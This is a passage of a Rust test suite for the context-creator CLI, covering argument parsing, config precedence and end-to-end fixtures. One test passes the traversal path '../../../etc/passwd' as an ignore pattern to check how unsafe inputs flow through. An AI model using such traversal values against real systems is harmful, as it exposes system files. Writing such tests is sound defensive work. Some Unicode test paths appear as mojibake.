    ]);

    match result3 {
        Ok(config3) => {
            assert_eq!(config3.get_prompt(), Some("Test unicode".to_string()));
            assert_eq!(
                config3.paths,
                Some(vec![
                    PathBuf::from("src/æµ‹è¯•/"),
                    PathBuf::from("src/cafÃ©/"),
                    PathBuf::from("src/ðŸš€/")
                ])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 4: Paths with parentheses and brackets
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result4 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test brackets",
        "src(1)/",
        "src[backup]/",
        "src{old}/",
    ]);

    match result4 {
        Ok(config4) => {
            assert_eq!(config4.get_prompt(), Some("Test brackets".to_string()));
            assert_eq!(
                config4.paths,
                Some(vec![
                    PathBuf::from("src(1)/"),
                    PathBuf::from("src[backup]/"),
                    PathBuf::from("src{old}/")
                ])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Parsing should work for all special characters
    // (validation will check if paths exist)
    // Parsing succeeded if we got here
}

#[test]
fn test_error_message_quality_for_invalid_combinations() {
    // Scenario 10: Invalid combinations with helpful error messages
    // This tests error message quality for new invalid combinations

    // Test 1: Prompt with output file (should fail with clear message)
    // Note: Currently fails with "--prompt cannot be used with directory paths"
    // After fixing restrictions, will fail with "--output and a prompt" error
    let config1 = Config::parse_from([
        "context-creator",
        "--prompt",
        "This should fail",
        "--output-file",
        "output.md",
        "src/",
    ]);

    let result1 = config1.validate();
    assert!(result1.is_err());
    let error_msg1 = result1.unwrap_err().to_string();
    // Current error (will change after fixing restrictions)
    assert!(
        error_msg1.contains("--prompt cannot be used with directory paths")
            || error_msg1.contains("Cannot specify both --output and a prompt")
    );

    // Test 2: Copy with output file (should fail with clear message)
    let config2 = Config::parse_from([
        "context-creator",
        "--copy",
        "--output-file",
        "output.md",
        "src/",
    ]);

    let result2 = config2.validate();
    assert!(result2.is_err());
    let error_msg2 = result2.unwrap_err().to_string();
    assert!(error_msg2.contains("Cannot specify both --copy and --output"));

    // Test 3: No input source (should fail with helpful message)
    let config3 = Config::parse_from(["context-creator", "--max-tokens", "100000", "--verbose"]);

    let result3 = config3.validate();
    assert!(result3.is_err());
    let error_msg3 = result3.unwrap_err().to_string();
    assert!(error_msg3.contains("At least one input source must be provided"));
    assert!(error_msg3.contains("--prompt, paths, --include, --repo, or --stdin"));

    // Test 4: Invalid repo URL (should fail with clear message)
    let config4 = Config::parse_from(["context-creator", "--repo", "not-a-github-url"]);

    let result4 = config4.validate();
    assert!(result4.is_err());
    let error_msg4 = result4.unwrap_err().to_string();
    assert!(error_msg4.contains("Repository URL must be a GitHub URL"));

    // Test 5: Nonexistent directory (should fail with clear message)
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result5 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test nonexistent",
        "/definitely/does/not/exist",
    ]);

    match result5 {
        Ok(config5) => {
            let validation_result = config5.validate();
            assert!(validation_result.is_err());
            let error_msg5 = validation_result.unwrap_err().to_string();
            assert!(
                error_msg5.contains("Directory does not exist")
                    || error_msg5.contains("--prompt cannot be used with directory paths")
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // All error messages should be helpful and specific
    // All error message checks passed
}

#[test]
fn test_semantic_options_with_flexible_combinations() {
    // Bonus test: Semantic analysis options with flexible combinations
    // This ensures all semantic flags work with new combinations

    // Test 1: All semantic flags with prompt and paths
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result1 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Deep analysis",
        "--trace-imports",
        "--include-callers",
        "--include-types",
        "--enhanced-context",
        "--semantic-depth",
        "5",
        "src/",
        "tests/",
    ]);

    match result1 {
        Ok(config1) => {
            assert_eq!(config1.get_prompt(), Some("Deep analysis".to_string()));
            assert!(config1.trace_imports);
            assert!(config1.include_callers);
            assert!(config1.include_types);
            assert!(config1.enhanced_context);
            assert_eq!(config1.semantic_depth, 5);
            assert_eq!(
                config1.paths,
                Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
            );
            // Will pass validation after we fix restrictions
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 2: Semantic flags with stdin and repo
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result2 = Config::try_parse_from([
        "context-creator",
        "--stdin",
        "--trace-imports",
        "--include-types",
        "--semantic-depth",
        "10",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert!(config2.trace_imports);
            assert!(config2.include_types);
            assert_eq!(config2.semantic_depth, 10);
            assert_eq!(
                config2.repo,
                Some("https://github.com/owner/repo".to_string())
            );
            // Will pass validation after we fix restrictions
            assert!(config2.validate().is_ok());
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }
}

#[test]
fn test_complex_real_world_scenarios() {
    // Bonus test: Complex real-world usage scenarios
    // This tests combinations that users would actually use

    // Test 1: Full-featured security audit command
    let config1 = Config::parse_from([
        "context-creator",
        "--prompt",
        "Perform comprehensive security audit focusing on authentication and authorization",
        "--include",
        "src/auth/**/*.rs",
        "--include",
        "src/security/**/*.rs",
        "--include",
        "src/api/**/*.rs",
        "--ignore",
        "**/*_test.rs",
        "--ignore",
        "target/**",
        "--trace-imports",
        "--include-types",
        "--semantic-depth",
        "3",
        "--max-tokens",
        "800000",
        "--tool",
        "gemini",
        "--verbose",
        "--progress",
    ]);

    assert_eq!(
        config1.get_prompt(),
        Some(
            "Perform comprehensive security audit focusing on authentication and authorization"
                .to_string()
        )
    );
    assert_eq!(config1.get_include_patterns().len(), 3);
    assert_eq!(config1.get_ignore_patterns().len(), 2);
    assert!(config1.trace_imports);
    assert!(config1.include_types);
    assert_eq!(config1.semantic_depth, 3);
    assert_eq!(config1.max_tokens, Some(800000));
    assert_eq!(config1.llm_tool.command(), "gemini");
    assert!(config1.verbose);
    assert!(config1.progress);

    // Test 2: Piped input with comprehensive analysis
    // NOTE: Currently fails at parsing due to ArgGroup restrictions (stdin + paths)
    let temp_dir2 = TempDir::new().unwrap();
    let src_dir2 = temp_dir2.path().join("src");
    let backend_dir = temp_dir2.path().join("backend");
    let frontend_dir = temp_dir2.path().join("frontend");
    std::fs::create_dir(&src_dir2).unwrap();
    std::fs::create_dir(&backend_dir).unwrap();
    std::fs::create_dir(&frontend_dir).unwrap();

    let result2 = Config::try_parse_from([
        "context-creator",
        "--stdin",
        "--include",
        "**/*.{rs,py,js}",
        "--ignore",
        "node_modules/**",
        "--ignore",
        "target/**",
        "--ignore",
        "venv/**",
        "--include-callers",
        "--enhanced-context",
        "--max-tokens",
        "500000",
        "--tool",
        "codex",
        "--copy",
        "--quiet",
        src_dir2.to_str().unwrap(),
        backend_dir.to_str().unwrap(),
        frontend_dir.to_str().unwrap(),
    ]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert_eq!(config2.get_include_patterns(), vec!["**/*.{rs,py,js}"]);
            assert_eq!(config2.get_ignore_patterns().len(), 3);
            assert!(config2.include_callers);
            assert!(config2.enhanced_context);
            assert_eq!(config2.max_tokens, Some(500000));
            assert_eq!(config2.llm_tool.command(), "codex");
            assert!(config2.copy);
            assert!(config2.quiet);
            assert_eq!(
                config2.paths,
                Some(vec![src_dir2, backend_dir, frontend_dir])
            );
            // Will pass validation after we fix restrictions
            assert!(config2.validate().is_ok());
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Config1 should pass validation after we fix restrictions
    assert!(config1.validate().is_ok());
}
```

## tests/config_precedence_test.rs

Imports: clap::Parser, context_creator::cli::Config, context_creator::core::walker::WalkOptions, std::fs, tempfile::TempDir, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, context_creator::core::walker::WalkOptions.WalkOptions, fs, tempfile::TempDir.TempDir

```rust
use clap::Parser;
use context_creator::cli::Config;
use context_creator::core::walker::WalkOptions;
use std::fs;
use tempfile::TempDir;

/// Test that CLI ignore patterns override config file patterns
#[test]
fn test_cli_ignore_patterns_override_config() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with some ignore patterns
    let config_content = r#"
ignore = ["config_*.rs", "config_target/**"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with different ignore patterns
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--ignore",
        "cli_*.rs",
        "--ignore",
        "cli_target/**",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // CLI ignore patterns should take precedence
    let ignore_patterns = config.get_ignore_patterns();
    assert_eq!(ignore_patterns, vec!["cli_*.rs", "cli_target/**"]);

    // Verify in WalkOptions as well
    let walk_options = WalkOptions::from_config(&config).unwrap();
    assert_eq!(
        walk_options.ignore_patterns,
        vec!["cli_*.rs", "cli_target/**"]
    );
}

/// Test that CLI include patterns override config file patterns
#[test]
fn test_cli_include_patterns_override_config() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with some include patterns
    let config_content = r#"
include = ["config_*.rs", "config_src/**"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with different include patterns
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--include",
        "cli_*.rs",
        "--include",
        "cli_src/**",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // CLI include patterns should take precedence
    let include_patterns = config.get_include_patterns();
    assert_eq!(include_patterns, vec!["cli_*.rs", "cli_src/**"]);

    // Verify in WalkOptions as well
    let walk_options = WalkOptions::from_config(&config).unwrap();
    assert_eq!(
        walk_options.include_patterns,
        vec!["cli_*.rs", "cli_src/**"]
    );
}

/// Test that when no CLI patterns are provided, config file patterns are used
#[test]
fn test_config_patterns_used_when_no_cli_patterns() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with ignore and include patterns
    let config_content = r#"
ignore = ["config_*.rs", "config_target/**"]
include = ["config_src/**/*.rs"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with no patterns - should use config file patterns
    let mut config =
        Config::parse_from(["context-creator", "--config", config_path.to_str().unwrap()]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // Config file patterns should be used
    let ignore_patterns = config.get_ignore_patterns();
    let include_patterns = config.get_include_patterns();

    // Config file patterns should be loaded when no CLI patterns are provided
    assert_eq!(ignore_patterns, vec!["config_*.rs", "config_target/**"]);
    assert_eq!(include_patterns, vec!["config_src/**/*.rs"]);
}

/// Test that empty CLI patterns don't override config file patterns
#[test]
fn test_empty_cli_patterns_dont_override_config() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with patterns
    let config_content = r#"
ignore = ["config_*.rs", "config_target/**"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with empty ignore patterns
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--ignore",
        "",
        "--ignore",
        "   ",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // CLI ignore patterns are present but empty - this should override config
    let ignore_patterns = config.get_ignore_patterns();
    assert_eq!(ignore_patterns, vec!["", "   "]);

    // But WalkOptions should filter out empty patterns
    let walk_options = WalkOptions::from_config(&config).unwrap();
    assert_eq!(walk_options.ignore_patterns, Vec::<String>::new());
}

/// Test precedence with mixed CLI and config patterns
#[test]
fn test_mixed_cli_and_config_precedence() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with both ignore and include patterns
    let config_content = r#"
ignore = ["config_*.rs", "config_target/**"]
include = ["config_src/**/*.rs"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with only ignore patterns (no include)
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--ignore",
        "cli_*.rs",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // CLI ignore patterns should override config ignore patterns
    let ignore_patterns = config.get_ignore_patterns();
    assert_eq!(ignore_patterns, vec!["cli_*.rs"]);

    // Config include patterns should be used since no CLI include patterns were provided
    let include_patterns = config.get_include_patterns();
    // Config file patterns should be loaded when no CLI patterns are provided
    assert_eq!(include_patterns, vec!["config_src/**/*.rs"]);
}

/// Test that CLI patterns work with default config behavior
#[test]
fn test_cli_patterns_with_default_config() {
    // No config file provided - should use CLI patterns only
    let config = Config::parse_from([
        "context-creator",
        "--ignore",
        "cli_*.rs",
        "--ignore",
        "cli_target/**",
        "--include",
        "cli_src/**/*.rs",
    ]);

    // Should use only CLI patterns
    let ignore_patterns = config.get_ignore_patterns();
    let include_patterns = config.get_include_patterns();

    assert_eq!(ignore_patterns, vec!["cli_*.rs", "cli_target/**"]);
    assert_eq!(include_patterns, vec!["cli_src/**/*.rs"]);

    // Verify in WalkOptions as well
    let walk_options = WalkOptions::from_config(&config).unwrap();
    assert_eq!(
        walk_options.ignore_patterns,
        vec!["cli_*.rs", "cli_target/**"]
    );
    assert_eq!(walk_options.include_patterns, vec!["cli_src/**/*.rs"]);
}

/// Test that CLI patterns work with validation scenarios
#[test]
fn test_cli_pattern_validation_scenarios() {
    // CLI config with potentially problematic patterns
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze code",
        "--ignore",
        "../../../etc/passwd",
        "--ignore",
        "valid_*.rs",
    ]);

    // CLI validation should pass - pattern validation happens later
    assert!(config.validate().is_ok());

    // WalkOptions creation should succeed - sanitization happens during walker building
    let walk_options_result = WalkOptions::from_config(&config);
    assert!(walk_options_result.is_ok());

    // Verify that the ignore patterns are passed through to WalkOptions
    let walk_options = walk_options_result.unwrap();
    assert_eq!(
        walk_options.ignore_patterns,
        vec!["../../../etc/passwd", "valid_*.rs"]
    );

    // Note: The actual security validation would happen when building the walker
    // This demonstrates that the CLI and WalkOptions creation don't block patterns
}

/// Test that CLI patterns work with prompt combinations
#[test]
fn test_cli_patterns_with_prompt_precedence() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with patterns
    let config_content = r#"
ignore = ["config_*.rs"]
include = ["config_src/**/*.rs"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with prompt and patterns
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--prompt",
        "Analyze security",
        "--include",
        "cli_src/**/*.rs",
        "--ignore",
        "cli_*.rs",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // All CLI options should work together
    assert_eq!(config.get_prompt(), Some("Analyze security".to_string()));
    assert_eq!(config.get_include_patterns(), vec!["cli_src/**/*.rs"]);
    assert_eq!(config.get_ignore_patterns(), vec!["cli_*.rs"]);

    // Verify in WalkOptions as well
    let walk_options = WalkOptions::from_config(&config).unwrap();
    assert_eq!(walk_options.include_patterns, vec!["cli_src/**/*.rs"]);
    assert_eq!(walk_options.ignore_patterns, vec!["cli_*.rs"]);
}

/// Test that config file patterns work with repo argument
#[test]
fn test_config_patterns_with_repo_precedence() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with patterns
    let config_content = r#"
ignore = ["config_*.rs"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with repo and ignore patterns
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--repo",
        "https://github.com/owner/repo",
        "--ignore",
        "cli_*.rs",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // CLI patterns should take precedence
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.get_ignore_patterns(), vec!["cli_*.rs"]);
}

/// Test that precedence works with multiple CLI invocations
#[test]
fn test_multiple_cli_invocations_precedence() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with patterns
    let config_content = r#"
ignore = ["config1_*.rs", "config2_*.rs"]
include = ["config_src/**/*.rs"]
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with multiple ignore patterns
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--ignore",
        "cli1_*.rs",
        "--ignore",
        "cli2_*.rs",
        "--ignore",
        "cli3_*.rs",
        "--include",
        "cli_src/**/*.rs",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // All CLI patterns should override config patterns
    assert_eq!(
        config.get_ignore_patterns(),
        vec!["cli1_*.rs", "cli2_*.rs", "cli3_*.rs"]
    );
    assert_eq!(config.get_include_patterns(), vec!["cli_src/**/*.rs"]);
}

/// Test that config file loading doesn't interfere with CLI patterns
#[test]
fn test_config_loading_doesnt_interfere_with_cli() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test-config.toml");

    // Create a config file with different token limits (not patterns)
    let config_content = r#"
[token_limits]
gemini = 500000
"#;
    fs::write(&config_path, config_content).unwrap();

    // CLI config with patterns
    let mut config = Config::parse_from([
        "context-creator",
        "--config",
        config_path.to_str().unwrap(),
        "--ignore",
        "cli_*.rs",
        "--include",
        "cli_src/**/*.rs",
    ]);

    // Load configuration from file
    config.load_from_file().unwrap();

    // CLI patterns should be unaffected by config file loading
    assert_eq!(config.get_ignore_patterns(), vec!["cli_*.rs"]);
    assert_eq!(config.get_include_patterns(), vec!["cli_src/**/*.rs"]);
}
```

## tests/config_rename_test.rs

Imports: assert_cmd::Command, std::fs, tempfile::TempDir

Type references: assert_cmd::Command.Command, fs, tempfile::TempDir.TempDir

```rust
//! Tests for configuration file loading after rename

use assert_cmd::Command;
use std::fs;
use tempfile::TempDir;

#[test]
fn test_new_config_file_is_recognized() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a basic config file with new name
    fs::write(
        &config_path,
        r#"
[defaults]
max_tokens = 50000
progress = true
"#,
    )
    .unwrap();

    // Change to temp directory and run command
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.current_dir(temp_dir.path())
        .arg("--help")
        .assert()
        .success();

    // The config should be loaded without errors
    // If config loading fails, the command would error out
}

#[test]
fn test_old_config_file_is_not_recognized() {
    let temp_dir = TempDir::new().unwrap();
    let old_config_path = temp_dir.path().join(".context-creator.toml");

    // Create config file with old name
    fs::write(
        &old_config_path,
        r#"
[defaults]
max_tokens = 50000
progress = true
"#,
    )
    .unwrap();

    // Change to temp directory and run command
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.current_dir(temp_dir.path())
        .arg("--help")
        .assert()
        .success();

    // The old config should not be loaded
    // This test verifies that old config files are ignored
}

#[test]
fn test_config_file_precedence_with_new_name() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create config with specific settings
    fs::write(
        &config_path,
        r#"
[defaults]
max_tokens = 25000
progress = false
quiet = true
"#,
    )
    .unwrap();

    // Test that the config is loaded by checking behavior
    // This is an integration test that verifies config loading works
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.current_dir(temp_dir.path())
        .arg("--help")
        .assert()
        .success();
}

#[test]
fn test_ignore_file_patterns_updated() {
    let temp_dir = TempDir::new().unwrap();

    // Create files with old ignore patterns (these should be ignored)
    fs::write(temp_dir.path().join(".digestignore"), "*.tmp\n").unwrap();
    fs::write(temp_dir.path().join(".digestkeep"), "important.tmp\n").unwrap();

    // Create files with new ignore patterns
    fs::write(temp_dir.path().join(".context-creator-ignore"), "*.tmp\n").unwrap();
    fs::write(
        temp_dir.path().join(".context-creator-keep"),
        "important.tmp\n",
    )
    .unwrap();

    // Create a test file that should be ignored
    fs::write(temp_dir.path().join("test.tmp"), "test content").unwrap();

    // Test that new ignore patterns are used
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.current_dir(temp_dir.path())
        .arg("--help")
        .assert()
        .success();
}
```

## tests/debug_include_types_test.rs

Imports: context_creator::cli::Config, context_creator::core::cache::FileCache, context_creator, std::collections::HashMap, std::fs, std::sync::Arc, tempfile::TempDir, config

Type references: context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, context_creator::cli::Config.Config

```rust
//! Debug test for include-types functionality

use context_creator::cli::Config;
use context_creator::core::cache::FileCache;
use context_creator::core::walker::{walk_directory, WalkOptions};
use std::collections::HashMap;
use std::fs;
use std::sync::Arc;
use tempfile::TempDir;

#[test]
fn debug_cross_directory_type_resolution() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create the same structure as the failing test
    fs::create_dir_all(root.join("src/models")).unwrap();
    fs::create_dir_all(root.join("src/handlers")).unwrap();
    fs::create_dir_all(root.join("shared/types")).unwrap();

    fs::write(
        root.join("src/handlers/user_handler.rs"),
        r#"
use crate::models::User;
use shared::types::ApiResponse;

pub fn handle_user_request(user_id: u32) -> ApiResponse<User> {
    let user = User::find(user_id);
    ApiResponse::ok(user)
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("src/models/user.rs"),
        r#"
pub struct User {
    pub id: u32,
    pub name: String,
}

impl User {
    pub fn find(id: u32) -> Self {
        Self { id, name: "Test User".to_string() }
    }
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("src/models/mod.rs"),
        r#"
mod user;
pub use user::User;
"#,
    )
    .unwrap();

    fs::write(
        root.join("shared/types/mod.rs"),
        r#"
pub struct ApiResponse<T> {
    pub data: T,
    pub status: u16,
}

impl<T> ApiResponse<T> {
    pub fn ok(data: T) -> Self {
        Self { data, status: 200 }
    }
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include: Some(vec!["**/user_handler.rs".to_string()]),
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    println!("Initial files found: {}", files.len());
    for file in &files {
        println!("  - {}", file.relative_path.display());
    }

    // Perform semantic analysis
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Check what type references were found
    for file in &files {
        println!("\nFile: {}", file.relative_path.display());
        println!("  Imports: {}", file.imports.len());
        for import in &file.imports {
            println!("    - {}", import.display());
        }
        println!("  Type references: {}", file.type_references.len());
        for type_ref in &file.type_references {
            println!(
                "    - {}: {:?} (definition_path: {:?})",
                type_ref.name, type_ref.module, type_ref.definition_path
            );
        }
    }

    // Convert to HashMap for file expansion
    let mut files_map = HashMap::new();
    for file in files {
        files_map.insert(file.path.clone(), file);
    }

    println!("\nBefore expansion: {} files", files_map.len());

    // Perform file expansion
    let expanded_map =
        context_creator::core::file_expander::expand_file_list(files_map, &config, &cache).unwrap();

    println!("After expansion: {} files", expanded_map.len());
    for file in expanded_map.values() {
        println!("  - {}", file.relative_path.display());
    }
}
```

## tests/e2e_test.rs

Imports: assert_cmd::prelude::*, predicates::prelude::*, std::fs, std::path::Path, std::process::Command, tempfile::TempDir

Type references: fs, std::path::Path.Path, std::process::Command.Command, tempfile::TempDir.TempDir, std::path::Path.Path, std::path::Path.Path, PathBuf, std::path::Path.Path, std::path::Path.Path, PathBuf, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path

```rust
//! End-to-End tests for context-creator
//!
//! These tests verify complete user workflows from CLI invocation to final output,
//! testing real-world scenarios and edge cases that users might encounter.

use assert_cmd::prelude::*;
use predicates::prelude::*;
use std::fs;
use std::path::Path;
use std::process::Command;
use tempfile::TempDir;

/// Helper function to check if content contains a path, handling both Unix and Windows separators
fn contains_path(content: &str, path: &str) -> bool {
    let unix_path = path.replace('\\', "/");
    let windows_path = path.replace('/', "\\");
    content.contains(&unix_path) || content.contains(&windows_path)
}

/// Create a realistic Rust project structure for testing
fn create_realistic_rust_project(temp_dir: &Path) -> std::path::PathBuf {
    let project_dir = temp_dir.join("rust_project");
    fs::create_dir_all(&project_dir).unwrap();

    // Create Cargo.toml
    fs::write(
        project_dir.join("Cargo.toml"),
        r#"
[package]
name = "example-project"
version = "0.1.0"
edition = "2021"

[dependencies]
serde = { version = "1.0", features = ["derive"] }
tokio = { version = "1.0", features = ["full"] }
anyhow = "1.0"

[dev-dependencies]
tempfile = "3.0"
"#,
    )
    .unwrap();

    // Create main application structure
    fs::create_dir_all(project_dir.join("src")).unwrap();
    fs::write(
        project_dir.join("src/main.rs"),
        r#"
//! Example application main entry point

use anyhow::Result;
use std::collections::HashMap;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
struct Config {
    database_url: String,
    port: u16,
    workers: usize,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            database_url: "postgresql://localhost/app".to_string(),
            port: 8080,
            workers: 4,
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let config = Config::default();
    
    println!("Starting server on port {}", config.port);
    println!("Database URL: {}", config.database_url);
    println!("Workers: {}", config.workers);
    
    // Simulate some async work
    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
    
    Ok(())
}

fn calculate_fibonacci(n: u32) -> u64 {
    match n {
        0 => 0,
        1 => 1,
        _ => calculate_fibonacci(n - 1) + calculate_fibonacci(n - 2),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fibonacci() {
        assert_eq!(calculate_fibonacci(0), 0);
        assert_eq!(calculate_fibonacci(1), 1);
        assert_eq!(calculate_fibonacci(10), 55);
    }
    
    #[test]
    fn test_config_default() {
        let config = Config::default();
        assert_eq!(config.port, 8080);
        assert_eq!(config.workers, 4);
    }
}
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("src/lib.rs"),
        r#"
//! Library module for example project

pub mod handlers;
pub mod models;
pub mod utils;

use anyhow::Result;
use std::collections::HashMap;

/// Database connection pool
pub struct Database {
    connections: HashMap<String, String>,
}

impl Database {
    pub fn new() -> Self {
        Self {
            connections: HashMap::new(),
        }
    }
    
    pub fn connect(&mut self, name: &str, url: &str) -> Result<()> {
        self.connections.insert(name.to_string(), url.to_string());
        Ok(())
    }
    
    pub fn execute_query(&self, query: &str) -> Result<Vec<String>> {
        // Simulate query execution
        Ok(vec![format!("Result for: {}", query)])
    }
}

impl Default for Database {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_database_creation() {
        let db = Database::new();
        assert!(db.connections.is_empty());
    }
    
    #[test]
    fn test_database_connection() {
        let mut db = Database::new();
        assert!(db.connect("main", "postgresql://localhost/test").is_ok());
        assert_eq!(db.connections.len(), 1);
    }
}
"#,
    )
    .unwrap();

    // Create subdirectories and modules
    fs::create_dir_all(project_dir.join("src/handlers")).unwrap();
    fs::write(
        project_dir.join("src/handlers/mod.rs"),
        r#"
//! HTTP request handlers

pub mod auth;
pub mod api;

use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct Response<T> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}

impl<T> Response<T> {
    pub fn success(data: T) -> Self {
        Self {
            success: true,
            data: Some(data),
            error: None,
        }
    }
    
    pub fn error(message: String) -> Self {
        Self {
            success: false,
            data: None,
            error: Some(message),
        }
    }
}
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("src/handlers/auth.rs"),
        r#"
//! Authentication handlers

use super::Response;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct User {
    pub id: u64,
    pub username: String,
    pub email: String,
}

pub fn login(request: LoginRequest) -> Response<User> {
    // Simulate authentication
    if request.username == "admin" && request.password == "password" {
        Response::success(User {
            id: 1,
            username: request.username,
            email: "admin@example.com".to_string(),
        })
    } else {
        Response::error("Invalid credentials".to_string())
    }
}

pub fn logout() -> Response<()> {
    Response::success(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_login() {
        let request = LoginRequest {
            username: "admin".to_string(),
            password: "password".to_string(),
        };
        let response = login(request);
        assert!(response.success);
        assert!(response.data.is_some());
    }
    
    #[test]
    fn test_invalid_login() {
        let request = LoginRequest {
            username: "user".to_string(),
            password: "wrong".to_string(),
        };
        let response = login(request);
        assert!(!response.success);
        assert!(response.error.is_some());
    }
}
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("src/handlers/api.rs"),
        r#"
//! API handlers

use super::Response;
use crate::models::Product;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct ListRequest {
    pub page: Option<u32>,
    pub limit: Option<u32>,
}

pub fn list_products(request: ListRequest) -> Response<Vec<Product>> {
    let page = request.page.unwrap_or(1);
    let limit = request.limit.unwrap_or(10);
    
    // Simulate product list
    let products = (1..=limit).map(|i| Product {
        id: (page - 1) * limit + i,
        name: format!("Product {}", i),
        price: 10.0 + (i as f64),
        description: format!("Description for product {}", i),
    }).collect();
    
    Response::success(products)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_list_products_default() {
        let request = ListRequest { page: None, limit: None };
        let response = list_products(request);
        assert!(response.success);
